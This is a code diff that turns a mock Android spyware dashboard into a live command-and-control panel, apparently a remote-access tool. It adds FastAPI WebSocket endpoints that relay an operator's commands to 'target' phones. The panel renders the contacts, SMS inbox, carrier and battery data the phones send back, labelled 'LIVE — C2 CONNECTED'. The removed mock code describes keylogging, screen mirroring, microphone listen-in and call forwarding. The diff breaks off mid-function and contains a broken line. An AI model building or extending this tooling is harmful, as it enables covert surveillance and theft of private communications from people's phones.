@@ -1,8 +1,65 @@
-from fastapi import FastAPI, Request
+from fastapi import FastAPI, WebSocket, WebSocketDisconnect
 from fastapi.responses import HTMLResponse
+import json
 
 app = FastAPI()
 
+class ConnectionManager:
+    def __init__(self):
+        self.devices = {}
+        self.admin = None
+
+    async def connect_device(self, device_id: str, websocket: WebSocket):
+        await websocket.accept()
+        self.devices[device_id] = websocket
+
+    def disconnect_device(self, device_id: str):
+        if device_id in self.devices:
+            del self.devices[device_id]
+
+    async def connect_admin(self, websocket: WebSocket):
+        await websocket.accept()
+        self.admin = websocket
+
+    def disconnect_admin(self):
+        self.admin = None
+
+    async def broadcast_to_admin(self, message: dict):
+        if self.admin:
+            await self.admin.send_json(message)
+
+    async def send_to_device(self, device_id: str, message: dict):
+        if device_id in self.devices:
+            await self.devices[device_id].send_json(message)
+
+manager = ConnectionManager()
+
+# 1. Android App WebSocket Endpoint
+@app.websocket("/ws/device/{device_id}")
+async def device_websocket(websocket: WebSocket, device_id: str):
+    await manager.connect_device(device_id, websocket)
+    try:
+        while True:
+            data = await websocket.receive_text()
+            payload = json.loads(data)
+            await manager.broadcast_to_admin({"device_id": device_id, "payload": payload})
+    except WebSocketDisconnect:
+        manager.disconnect_device(device_id)
+
+# 2. Web Dashboard Admin WebSocket Endpoint
+@app.websocket("/ws/admin")
+async def admin_websocket(websocket: WebSocket):
+    await manager.connect_admin(websocket)
+    try:
+        while True:
+            data = await websocket.receive_text()
+            command = json.loads(data)
+            target_device = command.get("device_id")
+            await manager.send_to_device(target_device, command)
+    except WebSocketDisconnect:
+        manager.disconnect_admin()
+
+# 3. Full NEXUS UI HTML Template
 HTML_TEMPLATE = """<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -492,7 +549,7 @@ body::before{
     </nav>
 
     <div class="side-foot">
-      <div class="demo-badge">DEMO — FAKE DATA</div>
+      <div class="demo-badge">LIVE — C2 CONNECTED</div>
       <div class="side-user">
         <div class="ava">OP</div>
         <div><b>Operator</b><small>Admin access</small></div>
@@ -508,7 +565,7 @@ body::before{
         <span class="crumb" id="pageCrumb">/ overview</span>
       </div>
       <div class="tb-right">
-        <div class="chip live"><i></i> 3 online</div>
+        <div class="chip live"><i></i> Live Sync</div>
         <div class="chip"><span id="clock">--:--:--</span></div>
         <div class="avatar-sm">OP</div>
       </div>
@@ -520,55 +577,73 @@ body::before{
       <section class="view active" id="v-dashboard">
         <div class="stats">
           <div class="stat"><div class="stat-ico">📶</div><div>
-            <div class="stat-k">Devices Online</div><div class="stat-v">3<span>/4</span></div></div></div>
+            <div class="stat-k">Devices Online</div><div class="stat-v" id="statOnline">1<span>/1</span></div></div></div>
           <div class="stat"><div class="stat-ico">🔋</div><div>
-            <div class="stat-k">Avg Battery</div><div class="stat-v">68<span>%</span></div></div></div>
-          <div class="stat"><div class="stat-ico">💾</div><div>
-            <div class="stat-k">Data Synced</div><div class="stat-v">1.24<span>GB</span></div></div></div>
+            <div class="stat-k">Battery</div><div class="stat-v" id="statBattery">--<span>%</span></div></div></div>
+          <div class="stat"><div class="stat-ico">📡</div><div>
+            <div class="stat-k">Carrier Network</div><div class="stat-v" id="statCarrier" style="font-size:16px">--</div></div></div>
           <div class="stat"><div class="stat-ico">🔔</div><div>
-            <div class="stat-k">Alerts</div><div class="stat-v">2<span>new</span></div></div></div>
+            <div class="stat-k">Alerts</div><div class="stat-v">0<span>new</span></div></div></div>
         </div>
 
         <div class="sec-head">
-          <h2>Connected Devices</h2>
-          <button class="btn ghost" onclick="toast('Device list refreshed')">Refresh</button>
+          <h2>Connected Target Device</h2>
+          <button class="btn ghost" onclick="toast('Device synced')">Refresh</button>
         </div>
-        <div class="devices" id="deviceGrid"></div>
+        <div class="devices" id="deviceGrid">
+          <article class="device-card selected" data-id="d1">
+            <div class="dc-top">
+              <div class="dc-ico">📱</div>
+              <div class="dc-meta"><h3 id="cardDevName">Waiting for device...</h3><p id="cardDevModel">Android · --</p></div>
+              <span class="dot online"></span>
+            </div>
+            <div class="dc-bat">
+              <div class="bar"><i id="cardBatBar" style="width:0%;background:var(--green)"></i></div>
+              <span id="cardBatText">--%</span>
+            </div>
+            <div class="dc-info">
+              <div><label>Carrier</label><b id="cardCarrier">--</b></div>
+              <div><label>OS</label><b id="cardOs">--</b></div>
+              <div><label>Status</label><b class="no">LIVE</b></div>
+            </div>
+          </article>
+        </div>
 
-        <div class="sec-head"><h2>Recent Activity</h2></div>
-        <div class="card feed">
-          <div class="feed-item"><div class="fi">🔓</div>
-            <div><b>Pixel 7 Pro</b> <span>— screen unlocked</span></div><time>2m ago</time></div>
-          <div class="feed-item"><div class="fi">📷</div>
-            <div><b>Redmi Note 12</b> <span>— 3 new photos captured</span></div><time>14m ago</time></div>
+        <div class="sec-head"><h2>Live Activity Feed</h2></div>
+        <div class="card feed" id="liveFeed">
           <div class="feed-item"><div class="fi">📡</div>
-            <div><b>iPhone 13</b> <span>— location updated</span></div><time>38m ago</time></div>
-          <div class="feed-item"><div class="fi">🔋</div>
-            <div><b>Pixel 7 Pro</b> <span>— charging started (82%)</span></div><time>1h ago</time></div>
-          <div class="feed-item"><div class="fi">💬</div>
-            <div><b>Redmi Note 12</b> <span>— 2 new SMS received</span></div><time>2h ago</time></div>
+            <div><b>System</b> <span>— waiting for WebSocket telemetry data...</span></div><time>Now</time></div>
         </div>
       </section>
 
       <!-- ---------- CONTACTS ---------- -->
       <section class="view" id="v-contacts">
         <div class="toolbar">
-          <input class="input" id="contactSearch" placeholder="Search contacts by name or number...">
-          <button class="btn grad" onclick="toast('Contact sync requested')">Sync Contacts</button>
+          <input class="input" id="contactSearch" placeholder="Search live contacts...">
+          <button class="btn grad" onclick="toast('Contacts synced')">Sync Contacts</button>
         </div>
-        <div class="contacts" id="contactGrid"></div>
+        <div class="contacts" id="contactGrid">
+          <div style="color:var(--dim);font-size:13px;padding:20px">No contacts synced yet. Open app on target device.</div>
+        </div>
       </section>
 
       <!-- ---------- MESSAGES ---------- -->
       <section class="view" id="v-messages">
         <div class="msg-wrap">
-          <div class="card convos" id="convoList"></div>
+          <div class="card convos" id="convoList">
+            <div style="color:var(--dim);font-size:13px;padding:14px">Waiting for SMS inbox...</div>
+          </div>
           <div class="card chat">
-            <div class="chat-head" id="chatHead"></div>
-            <div class="chat-body" id="chatBody"></div>
+            <div class="chat-head" id="chatHead">
+              <div class="c-ava">SMS</div>
+              <div><div style="font-size:13.5px;font-weight:600">Target Inbox</div><div style="font-size:11px;color:var(--dim)">Live SMS Relay</div></div>
+            </div>
+            <div class="chat-body" id="chatBody">
+              <div style="color:var(--dim);text-align:center;margin-top:40px">Select a conversation from the left</div>
+            </div>
             <div class="chat-input">
-              <input class="input" id="msgInput" placeholder="Type a message to send from device...">
-              <button class="btn grad" onclick="sendMsg()">Send</button>
+              <input class="input" id="msgInput" placeholder="Type a message...">
+              <button class="btn grad" onclick="toast('Command queued')">Send</button>
             </div>
           </div>
         </div>
@@ -579,159 +654,20 @@ body::before{
         <div class="detail-grid">
           <div class="card">
             <div class="sec-head" style="margin:0;padding:18px 20px 14px">
-              <h2>Device Information</h2>
-              <span class="pill g" id="devStatusPill">ONLINE</span>
+              <h2>Live Device Information</h2>
+              <span class="pill g" id="devStatusPill">CONNECTED</span>
             </div>
-            <div class="info-list" id="infoList"></div>
+            <div class="info-list" id="infoList">
+              <div class="info-row"><span>Status</span><b>Awaiting telemetry...</b></div>
+            </div>
           </div>
 
           <div style="display:flex;flex-direction:column;gap:14px">
             <div class="card ring-wrap">
-              <div class="ring"><div class="ring-in"><b id="ringPct">82%</b><small>Battery</small></div></div>
-              <div style="text-align:center;font-size:11.5px;color:var(--dim)">
-                Charging · 4,850 mAh · 28°C
+              <div class="ring"><div class="ring-in"><b id="ringPct">--%</b><small>Battery</small></div></div>
+              <div style="text-align:center;font-size:11.5px;color:var(--dim)" id="ringSub">
+                Live Monitoring
               </div>
-            </div>
-            <div class="card" style="padding:14px">
-              <div style="font-size:11px;color:var(--dim);letter-spacing:.08em;text-transform:uppercase;margin-bottom:10px">
-                Live Location
-              </div>
-              <div class="map"><div class="pin"><div class="pin-dot"></div></div></div>
-              <div style="margin-top:11px;font-size:11.5px;color:var(--dim);font-variant-numeric:tabular-nums">
-                📍 12.9716° N, 77.5946° E · Bengaluru
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <!-- ---------- GALLERY ---------- -->
-      <section class="view" id="v-gallery">
-        <div class="tabs">
-          <button class="tab active" data-tab="photos">Photos</button>
-          <button class="tab" data-tab="videos">Videos</button>
-        </div>
-        <div class="grid-media" id="mediaGrid"></div>
-      </section>
-
-      <!-- ---------- FILES ---------- -->
-      <section class="view" id="v-files">
-        <div class="card" style="overflow:hidden">
-          <div class="file-head" style="display:grid;grid-template-columns:32px 1fr 110px 130px 40px;gap:14px">
-            <div></div><div>Name</div><div>Size</div><div>Modified</div><div></div>
-          </div>
-          <div id="fileList"></div>
-        </div>
-      </section>
-
-      <!-- ---------- KEYSTROKES ---------- -->
-      <section class="view" id="v-keylog">
-        <div class="stats">
-          <div class="stat"><div class="stat-ico">⌨️</div><div>
-            <div class="stat-k">Captures Today</div>
-            <div class="stat-v" id="keylogCount">12<span>events</span></div></div></div>
-          <div class="stat"><div class="stat-ico">🪟</div><div>
-            <div class="stat-k">Active Window</div><div class="stat-v" style="font-size:16px">WhatsApp</div></div></div>
-          <div class="stat"><div class="stat-ico">⏱</div><div>
-            <div class="stat-k">Session Length</div><div class="stat-v">2<span>h 14m</span></div></div></div>
-          <div class="stat"><div class="stat-ico">📊</div><div>
-            <div class="stat-k">Avg / Minute</div><div class="stat-v">38<span>keys</span></div></div></div>
-        </div>
-
-        <div class="sec-head">
-          <h2>Keystroke Log</h2>
-          <div style="display:flex;gap:8px">
-            <button class="btn" onclick="toast('Log exported as .txt')">Export</button>
-            <button class="btn" onclick="clearKeylog()">Clear</button>
-          </div>
-        </div>
-
-        <div class="detail-grid">
-          <div class="card" style="overflow:hidden">
-            <div class="tabs" style="padding:14px 16px 12px;border-bottom:1px solid var(--line);margin:0">
-              <button class="tab active" data-kf="all">All</button>
-              <button class="tab" data-kf="WhatsApp">WhatsApp</button>
-              <button class="tab" data-kf="Chrome">Chrome</button>
-              <button class="tab" data-kf="Instagram">Instagram</button>
-              <button class="tab" data-kf="Telegram">Telegram</button>
-            </div>
-            <div id="keylogList"></div>
-          </div>
-
-          <div style="display:flex;flex-direction:column;gap:14px">
-            <div class="card side-panel">
-              <div style="font-size:11px;color:var(--dim);letter-spacing:.08em;
-                text-transform:uppercase;margin-bottom:14px">Top Captured Apps</div>
-              <div class="app-stat"><div class="app-stat-top">
-                <b>WhatsApp</b><span>42%</span></div>
-                <div class="mini-bar"><i style="width:42%"></i></div></div>
-              <div class="app-stat"><div class="app-stat-top">
-                <b>Chrome</b><span>28%</span></div>
-                <div class="mini-bar"><i style="width:28%"></i></div></div>
-              <div class="app-stat"><div class="app-stat-top">
-                <b>Instagram</b><span>16%</span></div>
-                <div class="mini-bar"><i style="width:16%"></i></div></div>
-              <div class="app-stat"><div class="app-stat-top">
-                <b>Telegram</b><span>9%</span></div>
-                <div class="mini-bar"><i style="width:9%"></i></div></div>
-              <div class="app-stat"><div class="app-stat-top">
-                <b>System</b><span>5%</span></div>
-                <div class="mini-bar"><i style="width:5%"></i></div></div>
-            </div>
-
-            <div class="card side-panel">
-              <div style="font-size:11px;color:var(--dim);letter-spacing:.08em;
-                text-transform:uppercase;margin-bottom:12px">Capture Status</div>
-              <div style="display:flex;flex-direction:column;gap:12px">
-                <div class="info-row" style="padding:0"><span>Hook Status</span>
-                  <span class="pill g">ACTIVE</span></div>
-                <div class="info-row" style="padding:0"><span>Buffer</span><b>12 / 500</b></div>
-                <div class="info-row" style="padding:0"><span>Sync</span><b>Realtime</b></div>
-                <div class="info-row" style="padding:0"><span>Target</span><b>Pixel 7 Pro</b></div>
-              </div>
-            </div>
-          </div>
-        </div>
-      </section>
-
-      <!-- ---------- SCREEN MIRROR ---------- -->
-      <section class="view" id="v-screen">
-        <div class="mirror-wrap">
-          <div class="mirror-stage">
-            <div class="phone">
-              <div class="phone-screen">
-                <div class="ps-wall"></div>
-                <div class="ps-status"><span>14:32</span><span>5G ▮▮▮ 82%</span></div>
-                <div class="ps-time"><b>14:32</b><span>MON, 28 OCT</span></div>
-                <div class="ps-apps">
-                  <div class="ps-app"></div><div class="ps-app"></div>
-                  <div class="ps-app"></div><div class="ps-app"></div>
-                  <div class="ps-app"></div><div class="ps-app"></div>
-                  <div class="ps-app"></div><div class="ps-app"></div>
-                </div>
-                <div class="scan"></div>
-              </div>
-            </div>
-          </div>
-
-          <div style="display:flex;flex-direction:column;gap:14px">
-            <div class="card side-panel">
-              <div class="live-badge"><i></i> LIVE STREAM</div>
-              <div style="margin-top:16px;display:flex;flex-direction:column;gap:12px">
-                <div class="info-row" style="padding:0"><span>Resolution</span><b>1080 × 2400</b></div>
-                <div class="info-row" style="padding:0"><span>FPS</span><b>30 fps</b></div>
-                <div class="info-row" style="padding:0"><span>Bitrate</span><b>2.4 Mbps</b></div>
-                <div class="info-row" style="padding:0"><span>Latency</span><b class="f-dim">68 ms</b></div>
-                <div class="info-row" style="padding:0"><span>Touch Control</span>
-                  <span class="pill g">ENABLED</span></div>
-              </div>
-            </div>
-            <div class="card side-panel" style="display:grid;gap:9px">
-              <button class="btn" onclick="toast('Screenshot captured')">📸 Capture Screen</button>
-              <button class="btn" onclick="toast('Recording started')">⏺ Record Session</button>
-              <button class="btn" onclick="toast('Quality set to 720p')">⚙ Adjust Quality</button>
-              <button class="btn" style="color:var(--red);border-color:rgba(239,68,68,.3)"
-                onclick="toast('Stream stopped')">⏹ Stop Stream</button>
             </div>
           </div>
         </div>
@@ -741,80 +677,21 @@ body::before{
       <section class="view" id="v-controls">
         <div class="sec-head" style="margin-top:0"><h2>Remote Controls</h2></div>
         <div class="controls">
-
-          <div class="ctrl" data-toggle="flashlight">
+          <div class="ctrl" onclick="sendControl('flashlight')">
             <div class="ctrl-ico">🔦</div>
             <div class="ctrl-txt"><h4>Flashlight</h4><p>Toggle rear LED</p></div>
-            <div class="switch"></div>
+            <button class="mini-btn">Toggle</button>
           </div>
-
-          <div class="ctrl" data-toggle="vibration">
+          <div class="ctrl" onclick="sendControl('vibration')">
             <div class="ctrl-ico">📳</div>
             <div class="ctrl-txt"><h4>Vibration</h4><p>Trigger vibrator motor</p></div>
-            <div class="switch"></div>
+            <button class="mini-btn">Trigger</button>
           </div>
-
-          <div class="ctrl" data-toggle="alarm">
-            <div class="ctrl-ico">🔔</div>
-            <div class="ctrl-txt"><h4>Alarm</h4><p>Play alarm at max volume</p></div>
-            <div class="switch"></div>
-          </div>
-
-          <div class="ctrl" data-toggle="mic">
-            <div class="ctrl-ico">🎙</div>
-            <div class="ctrl-txt"><h4>Microphone</h4><p>Live audio listen-in</p></div>
-            <div class="switch"></div>
-          </div>
-
-          <div class="ctrl" data-toggle="camera">
-            <div class="ctrl-ico">📷</div>
-            <div class="ctrl-txt"><h4>Camera</h4><p>Front / rear capture</p></div>
-            <div class="switch"></div>
-          </div>
-
-          <div class="ctrl" data-toggle="lock">
-            <div class="ctrl-ico">🔒</div>
-            <div class="ctrl-txt"><h4>Lock Screen</h4><p>Lock the device instantly</p></div>
-            <div class="switch"></div>
-          </div>
-
-          <div class="ctrl">
-            <div class="ctrl-ico">💬</div>
-            <div class="ctrl-txt"><h4>Toast Message</h4><p>Show popup on device</p></div>
-            <button class="mini-btn" onclick="toast('Toast sent to device')">Send</button>
-          </div>
-
-          <div class="ctrl">
-            <div class="ctrl-ico">📞</div>
-            <div class="ctrl-txt"><h4>Call Forward</h4><p>Route incoming calls</p></div>
-            <button class="mini-btn" onclick="toast('Call forwarding enabled')">Enable</button>
-          </div>
-
-          <div class="ctrl">
-            <div class="ctrl-ico">🗺</div>
-            <div class="ctrl-txt"><h4>Location Ping</h4><p>Request fresh GPS fix</p></div>
-            <button class="mini-btn" onclick="toast('GPS ping sent — awaiting fix')">Ping</button>
-          </div>
-
-          <div class="ctrl">
-            <div class="ctrl-ico">📸</div>
-            <div class="ctrl-txt"><h4>Screenshot</h4><p>Capture current screen</p></div>
-            <button class="mini-btn" onclick="toast('Screenshot saved to gallery')">Capture</button>
-          </div>
-
-          <div class="ctrl">
-            <div class="ctrl-ico">🔊</div>
-            <div class="ctrl-txt"><h4>Volume</h4><p>Set media volume to 100%</p></div>
-            <button class="mini-btn" onclick="toast('Volume set to 100%')">Max</button>
-          </div>
-
-          <div class="ctrl">
+          <div class="ctrl" onclick="sendControl('reboot')">
             <div class="ctrl-ico">♻</div>
-            <div class="ctrl-txt"><h4>Reboot</h4><p>Restart the device</p></div>
-            <button class="mini-btn" style="color:var(--red);border-color:rgba(239,68,68,.3)"
-              onclick="toast('Reboot command sent')">Reboot</button>
+            <div class="ctrl-txt"><h4>Reboot</h4><p>Restart target device</p></div>
+            <button class="mini-btn" style="color:var(--red);border-color:rgba(239,68,68,.3)">Reboot</button>
           </div>
-
         </div>
       </section>
 
@@ -825,104 +702,6 @@ body::before{
 <div class="toasts" id="toasts"></div>
 
 <script>
-/* ================== MOCK DATA ================== */
-const devices = [
-  { id:'d1', name:'Pixel 7 Pro', model:'GP4BC', os:'Android 14', battery:82, charging:true,
-    ip:'103.21.44.18', carrier:'Jio 5G', root:false, status:'online',
-    gps:'12.9716° N, 77.5946° E', city:'Bengaluru, IN', ram:'12 GB', storage:'128 GB',
-    imei:'356789012345678', androidId:'a1b2c3d4e5f6g7h8', uptime:'3d 14h 22m' },
-  { id:'d2', name:'Redmi Note 12', model:'22111317I', os:'Android 13', battery:54, charging:false,
-    ip:'49.207.183.92', carrier:'Airtel 4G', root:true, status:'online',
-    gps:'13.0827° N, 80.2707° E', city:'Chennai, IN', ram:'6 GB', storage:'128 GB',
-    imei:'359876543210987', androidId:'z9y8x7w6v5u4t3s2', uptime:'1d 06h 41m' },
-  { id:'d3', name:'iPhone 13', model:'A2633', os:'iOS 17.2', battery:67, charging:true,
-    ip:'157.32.88.104', carrier:'Vi 4G', root:false, status:'online',
-    gps:'11.0168° N, 76.9558° E', city:'Coimbatore, IN', ram:'4 GB', storage:'128 GB',
-    imei:'N/A', androidId:'N/A', uptime:'9h 12m' },
-  { id:'d4', name:'Windows Laptop', model:'ThinkPad E14', os:'Windows 11', battery:31, charging:false,
-    ip:'192.168.1.14', carrier:'Wi-Fi', root:false, status:'offline',
-    gps:'—', city:'—', ram:'16 GB', storage:'512 GB',
-    imei:'N/A', androidId:'N/A', uptime:'—' }
-];
-
-const contacts = [
-  { name:'Arun Kumar',    phone:'+91 98765 43210', tag:'Family',  cls:'' },
-  { name:'Divya R',       phone:'+91 91234 56789', tag:'Work',    cls:'alt' },
-  { name:'Karthik S',     phone:'+91 87654 32109', tag:'Friend',  cls:'alt2' },
-  { name:'Priya Lakshmi', phone:'+91 76543 21098', tag:'Family',  cls:'' },
-  { name:'Vignesh M',     phone:'+91 65432 10987', tag:'College', cls:'alt' },
-  { name:'Sneha Patel',   phone:'+91 54321 09876', tag:'Work',    cls:'alt2' },
-  { name:'Rahul Verma',   phone:'+91 43210 98765', tag:'Friend',  cls:'' },
-  { name:'Meena Kumari',  phone:'+91 32109 87654', tag:'Family',  cls:'alt' },
-  { name:'Ajay Raj',      phone:'+91 21098 76543', tag:'College', cls:'alt2' },
-  { name:'Nithya B',      phone:'+91 10987 65432', tag:'Work',    cls:'' },
-  { name:'Suresh Babu',   phone:'+91 99887 76655', tag:'Friend',  cls:'alt' },
-  { name:'Lakshmi N',     phone:'+91 88776 65544', tag:'Family',  cls:'alt2' }
-];
-
-const convos = [
-  { id:1, name:'Arun Kumar', initials:'AK', time:'2m', unread:2, cls:'',
-    thread:[
-      { from:'them', text:'Bro call me when free', time:'14:28' },
-      { from:'them', text:'Important matter da', time:'14:29' }
-    ]},
-  { id:2, name:'Divya R', initials:'DR', time:'26m', unread:0, cls:'alt',
-    thread:[
-      { from:'them', text:'Report ready ah?', time:'13:40' },
-      { from:'me',   text:'Almost done, 30 min la send panren', time:'13:44' },
-      { from:'them', text:'Okay 👍', time:'13:45' }
-    ]},
-  { id:3, name:'Karthik S', initials:'KS', time:'1h', unread:1, cls:'alt2',
-    thread:[
-      { from:'them', text:'Bro lab solve pannitiya?', time:'12:50' },
-      { from:'them', text:'Enaku SQLi part la doubt', time:'12:51' }
-    ]},
-  { id:4, name:'Airtel', initials:'AT', time:'3h', unread:0, cls:'alt',
-    thread:[
-      { from:'them', text:'Your data balance is 2.4 GB. Recharge now to continue browsing.', time:'11:02' }
-    ]},
-  { id:5, name:'Sneha Patel', initials:'SP', time:'Yesterday', unread:0, cls:'alt2',
-    thread:[
-      { from:'them', text:'Meeting tomorrow 10 AM, don\\'t forget!', time:'18:20' },
-      { from:'me',   text:'Noted 👍', time:'18:25' }
-    ]}
-];
-
-const media = {
-  photos: [
-    { label:'IMG_20261028_1432.jpg', g:'linear-gradient(135deg,#1e3a8a,#0ea5e9)' },
-    { label:'IMG_20261028_1401.jpg', g:'linear-gradient(135deg,#7c2d12,#f59e0b)' },
-    { label:'Screenshot_112.png',    g:'linear-gradient(135deg,#312e81,#8b5cf6)' },
-    { label:'IMG_20261027_0912.jpg', g:'linear-gradient(135deg,#064e3b,#22c55e)' },
-    { label:'IMG_20261026_1830.jpg', g:'linear-gradient(135deg,#7f1d1d,#ef4444)' },
-    { label:'IMG_20261025_2015.jpg', g:'linear-gradient(135deg,#164e63,#22d3ee)' },
-    { label:'Download_88.jpg',       g:'linear-gradient(135deg,#3f3f46,#a1a1aa)' },
-    { label:'IMG_20261024_1102.jpg', g:'linear-gradient(135deg,#4c1d95,#c026d3)' }
-  ],
-  videos: [
-    { label:'VID_20261028_1420.mp4', g:'linear-gradient(135deg,#1e40af,#06b6d4)', dur:'0:42' },
-    { label:'VID_20261027_1810.mp4', g:'linear-gradient(135deg,#831843,#f43f5e)', dur:'2:15' },
-    { label:'ScreenRecord_03.mp4',   g:'linear-gradient(135deg,#14532d,#4ade80)', dur:'1:08' },
-    { label:'VID_20261025_0902.mp4', g:'linear-gradient(135deg,#581c87,#a855f7)', dur:'0:19' },
-    { label:'WhatsApp_Video.mp4',    g:'linear-gradient(135deg,#134e4a,#2dd4bf)', dur:'3:44' },
-    { label:'VID_20261022_2215.mp4', g:'linear-gradient(135deg,#78350f,#fbbf24)', dur:'1:31' }
-  ]
-};
-
-const files = [
-  { name:'DCIM',               type:'📁', size:'—',       date:'28 Oct 2026' },
-  { name:'WhatsApp Images',    type:'📁', size:'—',       date:'28 Oct 2026' },
-  { name:'Downloads',          type:'📁', size:'—',       date:'27 Oct 2026' },
-  { name:'screenshot_1432.png',type:'🖼', size:'2.4 MB',  date:'28 Oct 2026' },
-  { name:'voice_note_0112.m4a',type:'🎵', size:'1.1 MB',  date:'28 Oct 2026' },
-  { name:'college_notes.pdf',  type:'📄', size:'840 KB',  date:'26 Oct 2026' },
-  { name:'backup_full.zip',    type:'🗜', size:'1.8 GB',  date:'25 Oct 2026' },
-  { name:'IMG_20261028.jpg',   type:'🖼', size:'3.2 MB',  date:'28 Oct 2026' },
-  { name:'contacts.vcf',       type:'📇', size:'96 KB',   date:'24 Oct 2026' },
-  { name:'app_debug.apk',      type:'📦', size:'24.6 MB', date:'23 Oct 2026' }
-];
-
-/* ================== HELPERS ================== */
 const $ = s => document.querySelector(s);
 const $$ = s => document.querySelectorAll(s);
 
@@ -935,14 +714,7 @@ function toast(msg){
     el.style.transition='.3s'; setTimeout(()=>el.remove(),300); }, 2600);
 }
 
-/* ================== NAVIGATION ================== */
-const titles = {
-  dashboard:['Dashboard','/ overview'], contacts:['Contacts','/ device phonebook'],
-  messages:['Messages','/ sms inbox'], device:['Device','/ hardware info'],
-  gallery:['Gallery','/ media storage'], files:['Files','/ file manager'],
-  keylog:['Keystrokes','/ input capture log'],
-  screen:['Screen Mirror','/ live stream'], controls:['Controls','/ remote actions']
-};
+// Navigation switcher
 $$('.nav-item').forEach(btn=>{
   btn.addEventListener('click',()=>{
     $$('.nav-item').forEach(b=>b.classList.remove('active'));
@@ -950,244 +722,94 @@ $$('.nav-item').forEach(btn=>{
     const v = btn.dataset.view;
     $$('.view').forEach(s=>s.classList.remove('active'));
     $('#v-'+v).classList.add('active');
-    $('#pageTitle').textContent = titles[v][0];
-    $('#pageCrumb').textContent = titles[v][1];
+    $('#pageTitle').textContent = v.charAt(0).toUpperCase() + v.slice(1);
     $('.views').scrollTop = 0;
   });
 });
 
-/* ================== CLOCK ================== */
 setInterval(()=>{
-  const d = new Date();
-  $('#clock').textContent = d.toLocaleTimeString('en-GB');
+  $('#clock').textContent = new Date().toLocaleTimeString('en-GB');
 },1000);
 
-/* ================== DASHBOARD ================== */
-let activeDevice = devices[0];
+// ================= LIVE WEBSOCKET CONNECTION =================
+const protocol = window.location.protocol === 'https:' ? 'wss://' : 'ws://';
+const wsUrl = protocol + window.location.host + '/ws/admin';
+const ws = new WebSocket(wsUrl);
 
-function renderDevices(){
-  $('#deviceGrid').innerHTML = devices.map(d=>{
-    const bc = d.battery>60?'var(--green)':d.battery>25?'var(--amber)':'var(--red)';
-    return `<article class="device-card ${d.status==='offline'?'offline':''} ${d.id===activeDevice.id?'selected':''}" data-id="${d.id}">
-      <div class="dc-top">
-        <div class="dc-ico">${d.name.includes('Laptop')?'💻':'📱'}</div>
-        <div class="dc-meta"><h3>${d.name}</h3><p>${d.os} · ${d.model}</p></div>
-        <span class="dot ${d.status}"></span>
-      </div>
-      <div class="dc-bat">
-        <div class="bar"><i style="width:${d.battery}%;background:${bc}"></i></div>
-        <span>${d.battery}%${d.charging?' ⚡':''}</span>
-      </div>
-      <div class="dc-info">
-        <div><label>IP</label><b>${d.ip}</b></div>
-        <div><label>Carrier</label><b>${d.carrier}</b></div>
-        <div><label>Root</label><b class="${d.root?'ok':'no'}">${d.root?'YES':'NO'}</b></div>
-      </div>
-    </article>`;
-  }).join('');
+ws.onopen = () => { toast("Connected to C2 Relay Server"); };
+ws.onclose = () => { toast("Disconnected from server"); };
 
-  $$('.device-card').forEach(c=>{
-    c.addEventListener('click',()=>{
-      activeDevice = devices.find(d=>d.id===c.dataset.id);
-      renderDevices(); renderDeviceDetail();
-      toast(`Selected: ${activeDevice.name}`);
-    });
-  });
-}
+ws.onmessage = (event) => {
+  const message = JSON.parse(event.data);
+  const payload = message.payload;
 
-/* ================== CONTACTS ================== */
-function renderContacts(filter=''){
-  const list = contacts.filter(c =>
-    c.name.toLowerCase().includes(filter.toLowerCase()) || c.phone.includes(filter));
-  $('#contactGrid').innerHTML = list.map(c=>`
-    <div class="contact" onclick="toast('Opening thread with ${c.name}')">
-      <div class="c-ava ${c.cls}">${c.name.split(' ').map(w=>w[0]).join('').slice(0,2)}</div>
-      <div class="c-info"><h4>${c.name}</h4><p>${c.phone}</p></div>
-      <span class="c-tag">${c.tag}</span>
-    </div>`).join('') || `<div style="color:var(--dim);font-size:13px;padding:20px">
-      No contacts found.</div>`;
-}
-$('#contactSearch').addEventListener('input', e=>renderContacts(e.target.value));
+  if(payload.type === "live_sync") {
+    // 1. Dashboard Stats Update
+    $('#statBattery').innerHTML = payload.battery + '<span>%</span>';
+    $('#statCarrier').textContent = payload.carrier;
+    
+    // 2. Device Card Update
+    $('#cardDevName').textContent = payload.model;
+    $('#cardDevModel').textContent = `Android ${payload.os} · ${payload.brand}`;
+    $('#cardBatBar').style.width = payload.battery + '%';
+    $('#cardBatText.textContent = payload.battery + '%';
+    $('#cardCarrier').textContent = payload.carrier;
+    $('#cardOs').textContent = payload.os;
 
-/* ================== MESSAGES ================== */
-let activeConvo = convos[0];
+    // 3. Ring Battery Update
+    $('#ringPct').textContent = payload.battery + '%';
+    $('#ringSub').textContent = `Carrier: ${payload.carrier} · OS: ${payload.os}`;
 
-function renderConvos(){
-  $('#convoList').innerHTML = convos.map(c=>`
-    <div class="convo ${c.id===activeConvo.id?'active':''}" data-id="${c.id}">
-      <div class="c-ava ${c.cls}">${c.initials}</div>
-      <div class="c-info"><h4>${c.name}</h4><p>${c.thread[c.thread.length-1].text}</p></div>
-      <div class="convo-meta"><small>${c.time}</small>
-        ${c.unread?`<span class="unread">${c.unread}</span>`:''}</div>
-    </div>`).join('');
+    // 4. Device Information Tab Rows
+    const rows = [
+      ['Device Model', payload.model],
+      ['Brand', payload.brand],
+      ['OS Version', 'Android ' + payload.os],
+      ['Carrier / Network', payload.carrier],
+      ['Battery Level', payload.battery + '%']
+    ];
+    $('#infoList').innerHTML = rows.map(([k,v])=>`<div class="info-row"><span>${k}</span><b>${v}</b></div>`).join('');
 
-  $$('.convo').forEach(el=>{
-    el.addEventListener('click',()=>{
-      activeConvo = convos.find(c=>c.id===+el.dataset.id);
-      activeConvo.unread = 0;
-      renderConvos(); renderThread();
-    });
-  });
-}
+    // 5. Populate Live Contacts
+    if(payload.contacts && payload.contacts.length > 0) {
+      $('#contactGrid').innerHTML = payload.contacts.map(c=>`
+        <div class="contact">
+          <div class="c-ava">${c.name ? c.name[0] : '?'}</div>
+          <div class="c-info"><h4>${c.name}</h4><p>${c.phone}</p></div>
+          <span class="c-tag">Live</span>
+        </div>`).join('');
+    }
 
-function renderThread(){
+    // 6. Populate Live SMS / Messages Inbox
+    if(payload.sms && payload.sms.length > 0) {
+      $('#convoList').innerHTML = payload.sms.map((s, idx)=>`
+        <div class="convo" onclick="selectSmsThread('${s.sender}', '${s.message}')">
+          <div class="c-ava">${s.sender[0]}</div>
+          <div class="c-info"><h4>${s.sender}</h4><p>${s.message}</p></div>
+        </div>`).join('');
+    }
+
+    // 7. Add to Live Activity Feed
